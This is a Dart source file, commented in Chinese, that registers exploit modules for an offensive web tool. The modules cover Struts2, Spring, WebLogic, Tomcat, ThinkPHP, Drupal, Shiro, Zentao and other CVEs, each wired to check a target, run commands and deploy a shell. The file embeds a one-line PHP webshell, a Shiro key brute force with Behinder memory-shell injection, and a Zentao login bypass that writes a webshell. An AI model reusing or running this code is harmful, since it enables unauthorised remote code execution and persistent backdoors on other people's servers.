/// 漏洞利用模块注册表：把各 CVE 服务适配成统一的 [ExploitModule]。
///
/// 目标：新增/调整一个 CVE 只需要在这里加一条，UI 不用改。
library;

import 'dart:typed_data';

import '../shiro/shiro_crypto.dart';
import '../shiro/shiro_exp_service.dart';
import '../shiro/shiro_mem_shell_service.dart';
import '../shiro/shiro_payload_repo.dart';
import '../thinkphp/thinkphp_exp_service.dart';
import '../vulhub/services/apache_family_services.dart';
import '../vulhub/services/exp_result.dart';
import '../vulhub/services/nacos_exp_service.dart';
import '../vulhub/services/runtime_services.dart';
import '../vulhub/services/web_stack_services.dart';
import '../vulhub/services/xxljob_exp_service.dart';
import '../vulhub/spring_exp_service.dart';
import '../vulhub/struts2_exp_service.dart';
import '../zentao/zentao_exp_service.dart';
import 'exploit_module.dart';
import 'shell_deployer.dart';

/// 极简 JS/PHP shell 源码（写盘用；参数名 c）。
const _phpShell = "<?php @system(\$_REQUEST['c']); ?>";
ExploitOutcome _fromExp(ExpResult r) {
  if (r.failed) return ExploitOutcome.probeFailed(r.vulnName, r.detail);
  if (r.vulnerable) return ExploitOutcome.vulnerable(r.vulnName, r.detail);
  return ExploitOutcome.notDetected(r.vulnName, r.detail);
}

ExploitOutcome _fromTp(ThinkphpResult r) {
  if (r.failed) return ExploitOutcome.probeFailed(r.vulnName, r.detail);
  if (r.vulnerable) return ExploitOutcome.vulnerable(r.vulnName, r.detail);
  return ExploitOutcome.notDetected(r.vulnName, r.detail);
}

/// 通用模块：检测/执行/取 shell 由回调提供；取 shell 未实现时回退到
/// "落盘 + HTTP 验证"（只要模块能执行命令）。
class SimpleExploitModule extends ExploitModule {
  SimpleExploitModule({
    required this.id,
    required this.name,
    required this.category,
    required this.cve,
    required this.description,
    required this.checkFn,
    this.execFn,
    this.shellFn,
    ShellKind? shellKind,
    this.shellHint,
  }) : _shellKind = shellKind;

  @override
  final String id;
  @override
  final String name;
  @override
  final String category;
  @override
  final String cve;
  @override
  final String description;

  final Future<ExploitOutcome> Function(ExploitTarget) checkFn;
  final Future<String?> Function(ExploitTarget, String)? execFn;
  final Future<ShellSession?> Function(ExploitTarget)? shellFn;
  final ShellKind? _shellKind;
  final String? shellHint;

  @override
  Set<ExploitCapability> get capabilities => {
    ExploitCapability.check,
    if (execFn != null) ExploitCapability.exec,
    if (shellFn != null || (execFn != null && _shellKind != null))
      ExploitCapability.getShell,
  };

  @override
  Future<ExploitOutcome> check(ExploitTarget target) => checkFn(target);

  @override
  Future<String?> exec(ExploitTarget target, String cmd) =>
      execFn == null ? Future.value(null) : execFn!(target, cmd);

  @override
  Future<ShellSession?> getShell(ExploitTarget target) async {
    if (shellFn != null) return shellFn!(target);
    final kind = _shellKind;
    final exec = execFn;
    if (kind == null || exec == null) return null;
    return ShellDeployer.deploy(
      targetUrl: target.url,
      exec: (cmd) => exec(target, cmd),
      kind: kind,
      serverHint: shellHint ?? kind.name,
      timeout: target.timeout,
    );
  }
}

final List<ExploitModule> exploitModules = [
  ..._struts2Modules(),
  ..._springModules(),
  ..._phpModules(),
  _tomcatModule(),
  ..._weblogicModules(),
  _httpdModule(),
  _drupalModule(),
  _nacosModule(),
  _xxlJobModule(),
  ..._thinkphpModules(),
  _shiroModule(),
  _zentaoModule(),
];

List<ExploitModule> modulesByCategory(String? category) => category == null
    ? exploitModules
    : exploitModules.where((m) => m.category == category).toList();

List<String> get exploitCategories =>
    exploitModules.map((m) => m.category).toSet().toList();

// ── Struts2 ───────────────────────────────────────────────────────────────────

List<ExploitModule> _struts2Modules() => [
  SimpleExploitModule(
    id: 'struts2-s2005',
    name: 'S2-005 OGNL 注入',
    category: 'Struts2',
    cve: 'CVE-2010-1870',
    description: '参数名 OGNL 注入；回显依赖 POST PoC（部分链路盲打）。',
    checkFn: (t) async => _fromExp(
      await Struts2ExpService(url: t.url).checkS2005(),
    ),
    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2005(cmd),
    shellKind: ShellKind.jsp,
  ),
  SimpleExploitModule(
    id: 'struts2-s2007',
    name: 'S2-007 类型转换注入',
    category: 'Struts2',
    cve: 'S2-007',
    description: '表单类型转换拼接 OGNL；自动尝试 user.action/login.action 等入口。',
    checkFn: (t) async => _fromExp(
      await Struts2ExpService(url: t.url).checkS2007(),
    ),
    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2007(cmd),
    shellKind: ShellKind.jsp,
  ),
  SimpleExploitModule(
    id: 'struts2-s2032',
    name: 'S2-032 DMI OGNL',
    category: 'Struts2',
    cve: 'CVE-2016-3081',
    description: '动态方法调用 OGNL 注入，带命令回显。',
    checkFn: (t) async => _fromExp(
      await Struts2ExpService(url: t.url).checkS2032(),
    ),
    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2032(cmd),
    shellKind: ShellKind.jsp,
  ),
  SimpleExploitModule(
    id: 'struts2-s2045',
    name: 'S2-045 Content-Type OGNL',
    category: 'Struts2',
    cve: 'CVE-2017-5638',
    description: 'Content-Type 头 OGNL 注入，回显在响应体。',
    checkFn: (t) async => _fromExp(
      await Struts2ExpService(url: t.url).checkS2045(),
    ),
    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2045(cmd),
    shellKind: ShellKind.jsp,
  ),
  SimpleExploitModule(
    id: 'struts2-s2052',
    name: 'S2-052 XStream 反序列化',
    category: 'Struts2',
    cve: 'S2-052',
    description: 'REST 插件 XStream 反序列化，盲打无回显。',
    checkFn: (t) async => _fromExp(
      await Struts2ExpService(url: t.url).checkS2052(),
    ),
    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2052(cmd),
    shellFn: (t) async => ShellDeployer.deploy(
      targetUrl: t.url,
      exec: (cmd) => Struts2ExpService(url: t.url).execS2052(cmd),
      kind: ShellKind.jsp,
      blind: true,
      timeout: t.timeout,
    ),
  ),
  SimpleExploitModule(
    id: 'struts2-s2053',
    name: 'S2-053 Freemarker 二次 OGNL',
    category: 'Struts2',
    cve: 'S2-053',
    description: 'Freemarker 模板二次 OGNL 求值。',
    checkFn: (t) async => _fromExp(
      await Struts2ExpService(url: t.url).checkS2053(),
    ),
    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2053(cmd),
    shellKind: ShellKind.jsp,
  ),
  SimpleExploitModule(
    id: 'struts2-s2057',
    name: 'S2-057 Namespace OGNL',
    category: 'Struts2',
    cve: 'CVE-2018-11776',
    description: 'Namespace OGNL 注入，输出在 Location 头。',
    checkFn: (t) async => _fromExp(
      await Struts2ExpService(url: t.url).checkS2057(),
    ),
    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2057(cmd),
    shellKind: ShellKind.jsp,
  ),
  SimpleExploitModule(
    id: 'struts2-s2059',
    name: 'S2-059 标签属性二次求值',
    category: 'Struts2',
    cve: 'CVE-2019-0230',
    description: '标签属性二次 OGNL；执行链分两步清沙箱后回显。',
    checkFn: (t) async => _fromExp(
      await Struts2ExpService(url: t.url).checkS2059(),
    ),
    execFn: (t, cmd) => Struts2ExpService(url: t.url).execS2059(cmd),
    shellKind: ShellKind.jsp,
  ),
];

// ── Spring ────────────────────────────────────────────────────────────────────

List<ExploitModule> _springModules() {
  SimpleExploitModule build(
    SpringVulnType type,
    String id,
    String name,
    String cve,
    String desc,
  ) => SimpleExploitModule(
    id: id,
    name: name,
    category: 'Spring',
    cve: cve,
    description: desc,
    checkFn: (t) async =>
        _fromExp(await SpringExpService(url: t.url).checkSingle(type)),
    execFn: (t, cmd) => SpringExpService(url: t.url).execRce(type, cmd),
    shellKind: ShellKind.jsp,
  );

  return [
    build(
      SpringVulnType.springCloudFunction,
      'spring-22963',
      'Spring Cloud Function SpEL',
      'CVE-2022-22963',
      'routing-expression 头 SpEL 注入；时间侧信道检测。',
    ),
    build(
      SpringVulnType.spring4Shell,
      'spring-22965',
      'Spring4Shell',
      'CVE-2022-22965',
      'ClassLoader 操控 AccessLogValve 写 JSP。',
    ),
    build(
      SpringVulnType.springDataCommons,
      'spring-1273',
      'Spring Data Commons SpEL',
      'CVE-2018-1273',
      'username 属性绑定 SpEL 注入。',
    ),
    build(
      SpringVulnType.springDataRest,
      'spring-8046',
      'Spring Data REST PATCH SpEL',
      'CVE-2017-8046',
      'JSON Patch path 中 SpEL 求值。',
    ),
    build(
      SpringVulnType.springSecurityOauth,
      'spring-4977',
      'Spring Security OAuth SpEL',
      'CVE-2016-4977',
      'OAuth 错误页 SpEL 注入。',
    ),
  ];
}

// ── PHP ───────────────────────────────────────────────────────────────────────

List<ExploitModule> _phpModules() => [
  SimpleExploitModule(
    id: 'php-backdoor',
    name: 'PHP 8.1.0-dev 后门',
    category: 'PHP',
    cve: 'PHP 8.1.0-dev backdoor',
    description: 'User-Agentt 头后门；命令载荷用变量函数规避关键词规则。',
    checkFn: (t) async =>
        _fromExp(await PhpBackdoorExpService(baseUrl: t.url).check()),
    execFn: (t, cmd) => PhpBackdoorExpService(baseUrl: t.url).execRce(cmd),
    shellKind: ShellKind.php,
  ),
  SimpleExploitModule(
    id: 'php-cgi-2012-1823',
    name: 'PHP-CGI 参数注入',
    category: 'PHP',
    cve: 'CVE-2012-1823',
    description: 'php-cgi 查询串参数注入，支持命令执行。',
    checkFn: (t) async =>
        _fromExp(await PhpCgiExpService(baseUrl: t.url).check()),
    execFn: (t, cmd) => PhpCgiExpService(baseUrl: t.url).execRce(cmd),
    shellKind: ShellKind.php,
  ),
];

// ── Tomcat ────────────────────────────────────────────────────────────────────

ExploitModule _tomcatModule() => SimpleExploitModule(
  id: 'tomcat-2017-12615',
  name: 'Tomcat PUT 写 JSP',
  category: 'Tomcat',
  cve: 'CVE-2017-12615',
  description: 'readonly=false 时 PUT 写 JSP 并执行；原生 getShell。',
  checkFn: (t) async => _fromExp(await TomcatExpService(baseUrl: t.url).check()),
  execFn: (t, cmd) => TomcatExpService(baseUrl: t.url).execRce(cmd),
  shellFn: (t) async {
    final url = await TomcatExpService(baseUrl: t.url).getShell();
    if (url == null) return null;
    return ShellSession(
      url: url,
      password: 'cmd',
      kind: 'jsp',
      connectorType: 'jsp_runtime',
      type: 'jsp',
      method: 'GET',
      note: 'Tomcat PUT 原生 shell',
    );
  },
);

// ── WebLogic ──────────────────────────────────────────────────────────────────

List<ExploitModule> _weblogicModules() => [
  SimpleExploitModule(
    id: 'weblogic-10271',
    name: 'WebLogic XMLDecoder',
    category: 'WebLogic',
    cve: 'CVE-2017-10271',
    description: '/wls-wsat XMLDecoder 反序列化。',
    checkFn: (t) async => _fromExp(
      await WebLogicExpService(baseUrl: t.url).checkCve201710271(),
    ),
    execFn: (t, cmd) =>
        WebLogicExpService(baseUrl: t.url).execRceCve201710271(cmd),
    shellKind: ShellKind.jsp,
  ),
  SimpleExploitModule(
    id: 'weblogic-14882',
    name: 'WebLogic 控制台绕过',
    category: 'WebLogic',
    cve: 'CVE-2020-14882',
    description: '控制台路径绕过；严格 TLS 优先，自签证书时放宽并标注。',
    checkFn: (t) async => _fromExp(
      await WebLogicExpService(baseUrl: t.url).checkCve202014882(),
    ),
    execFn: (t, cmd) =>
        WebLogicExpService(baseUrl: t.url).execRceCve202014882(cmd),
    shellKind: ShellKind.jsp,
  ),
];

// ── 其他 ──────────────────────────────────────────────────────────────────────

ExploitModule _httpdModule() => SimpleExploitModule(
  id: 'httpd-2021-41773',
  name: 'Apache httpd 路径穿越',
  category: 'Apache',
  cve: 'CVE-2021-41773',
  description: '路径穿越读文件；CGI 开启时可命令执行。',
  checkFn: (t) async =>
      _fromExp(await ApacheHttpdExpService(baseUrl: t.url).check()),
  execFn: (t, cmd) => ApacheHttpdExpService(baseUrl: t.url).execRce(cmd),
);

ExploitModule _drupalModule() => SimpleExploitModule(
  id: 'drupal-2018-7600',
  name: 'Drupalgeddon2',
  category: 'Drupal',
  cve: 'CVE-2018-7600',
  description: 'Form API #post_render 注入；未安装的站点会报"未安装"。',
  checkFn: (t) async =>
      _fromExp(await DrupalExpService(baseUrl: t.url).check()),
  execFn: (t, cmd) => DrupalExpService(baseUrl: t.url).execRce(cmd),
  shellKind: ShellKind.php,
);

ExploitModule _nacosModule() => SimpleExploitModule(
  id: 'nacos-2021-29441',
  name: 'Nacos 认证绕过',
  category: 'Nacos',
  cve: 'CVE-2021-29441',
  description: 'User-Agent 绕过鉴权读取用户列表（可作为后续 Derby RCE 入口）。',
  checkFn: (t) async =>
      _fromExp(await NacosExpService(baseUrl: t.url).check()),
);

ExploitModule _xxlJobModule() => SimpleExploitModule(
  id: 'xxl-job-unacc',
  name: 'XXL-JOB 未授权执行器',
  category: 'XXL-JOB',
  cve: 'XXL-JOB unauthenticated RCE',
  description: '执行器 /run 未授权调用（GLUE_SHELL）；目标应填执行器端口。',
  checkFn: (t) async =>
      _fromExp(await XxlJobExpService(baseUrl: t.url).check()),
  execFn: (t, cmd) => XxlJobExpService(baseUrl: t.url).execRce(cmd),
);

// ── ThinkPHP ──────────────────────────────────────────────────────────────────

List<ExploitModule> _thinkphpModules() {
  SimpleExploitModule build(
    ThinkphpVulnType type,
    String id,
    String name,
    String cve,
    String desc,
  ) => SimpleExploitModule(
    id: id,
    name: name,
    category: 'ThinkPHP',
    cve: cve,
    description: desc,
    checkFn: (t) async =>
        _fromTp(await ThinkphpExpService(url: t.url).checkSingle(type)),
    execFn: (t, cmd) => ThinkphpExpService(url: t.url).exeRce(type, cmd),
    shellFn: (t) async {
      final url = await ThinkphpExpService(
        url: t.url,
      ).getShell(type, _phpShell, password: 'c');
      if (url == null) return null;
      return ShellSession(
        url: url,
        password: 'c',
        kind: 'php',
        connectorType: 'php_passthru',
        type: 'php',
        method: 'GET',
        note: 'ThinkPHP 原生写马',
      );
    },
  );

  return [
    build(
      ThinkphpVulnType.tp5023,
      'thinkphp-tp5023',
      'ThinkPHP 5.0.23 RCE',
      'ThinkPHP 5.0.23',
      'captcha 路由 filter 注入。',
    ),
    build(
      ThinkphpVulnType.tp5022_5129,
      'thinkphp-tp5022',
      'ThinkPHP 5.0.22/5.1.29 RCE',
      'ThinkPHP 5.0.22/5.1.29',
      'invokefunction 链。',
    ),
    build(
      ThinkphpVulnType.tp2,
      'thinkphp-tp2',
      'ThinkPHP 2.x RCE',
      'ThinkPHP 2.x',
      'preg_replace /e 注入（payload 需 URL 编码）。',
    ),
  ];
}

// ── Shiro ─────────────────────────────────────────────────────────────────────

ExploitModule _shiroModule() => SimpleExploitModule(
  id: 'shiro-2016-4437',
  name: 'Shiro rememberMe 反序列化',
  category: 'Shiro',
  cve: 'CVE-2016-4437',
  description: '爆破 rememberMe key 并注入 Behinder 内存马（参考 shiro 原生实现）。',
  checkFn: (t) async {
    try {
      final ok = await ShiroExpService(url: t.url).checkIsShiro();
      return ok
          ? const ExploitOutcome.vulnerable(
              'Shiro rememberMe',
              '响应中出现 rememberMe=deleteMe，目标使用 Shiro',
            )
          : const ExploitOutcome.notDetected('Shiro rememberMe', '');
    } catch (e) {
      return ExploitOutcome.probeFailed('Shiro rememberMe', '$e');
    }
  },
  shellFn: (t) async {
    final repo = const ShiroPayloadRepo();
    final keys = await repo.loadKeys();
    if (keys.isEmpty) return null;
    final payload = await repo.loadPayload('shiro_payload_principal.b64');
    final svc = ShiroExpService(url: t.url, timeout: t.timeout);
    final key = await svc.bruteForceKey(
      candidateKeysBase64: keys,
      serializedPayload: payload,
      mode: ShiroEncryptionMode.cbc,
    );
    if (key == null) return null;

    final token = DateTime.now().millisecondsSinceEpoch.toRadixString(16);
    final path = '/mx$token.ico';
    final password = 'mx$token';
    final bytes = await const ShiroMemShellService().buildShellClass(
      type: MemShellType.filter,
      password: password,
      path: path,
    );
    final result = await const ShiroMemShellService().inject(
      targetUrl: t.url,
      keyBase64: key,
      shellClassBytes: Uint8List.fromList(bytes),
      shellPath: path,
      shellPassword: password,
      mode: ShiroEncryptionMode.cbc,
    );
    if (!result.success) return null;
    final base = Uri.parse(t.url);
    return ShellSession(
      url: base.replace(path: path, query: null).toString(),
      password: password,
      kind: 'memshell',
      connectorType: 'jsp_behinder',
      type: 'jsp',
      method: 'POST',
      note: 'Shiro 内存马（Behinder filter），key=$key',
    );
  },
);

// ── Zentao ────────────────────────────────────────────────────────────────────

ExploitModule _zentaoModule() => SimpleExploitModule(
  id: 'zentao-2024-24216',
  name: 'Zentao 登录绕过 + 写马',
  category: 'Zentao',
  cve: 'CVE-2024-24216',
  description: '绕过登录后通过 Repo 配置写入 Behinder WebShell。',
  checkFn: (t) async {
    try {
      final base = await ZentaoExpService.detectZentaoBase(t.url);
      if (base == null) {
        return const ExploitOutcome.notDetected('Zentao', '未识别到禅道入口');
      }
      final svc = ZentaoExpService(url: base);
      final sid = await svc.tryBypassLogin();
      return sid == null
          ? const ExploitOutcome.notDetected('Zentao', '登录绕过失败')
          : const ExploitOutcome.vulnerable(
              'CVE-2024-24216',
              '登录绕过成功（拿到 zentaosid）',
            );
    } catch (e) {
      return ExploitOutcome.probeFailed('Zentao', '$e');
    }
  },
  shellFn: (t) async {
    final base = await ZentaoExpService.detectZentaoBase(t.url);
    if (base == null) return null;
    final url = await ZentaoExpService(
      url: base,
    ).getShell(shellContent: _phpShell);
    if (url == null) return null;
    return ShellSession(
      url: url,
      password: 'c',
      kind: 'php',
      connectorType: 'php_passthru',
      type: 'php',
      method: 'GET',
    );
  },
);

/// 便于外部判断模块能否落盘 shell（UI 提示用）。
bool moduleCanDeployShell(ExploitModule m) =>
    m.supports(ExploitCapability.getShell) &&
    m.supports(ExploitCapability.exec);
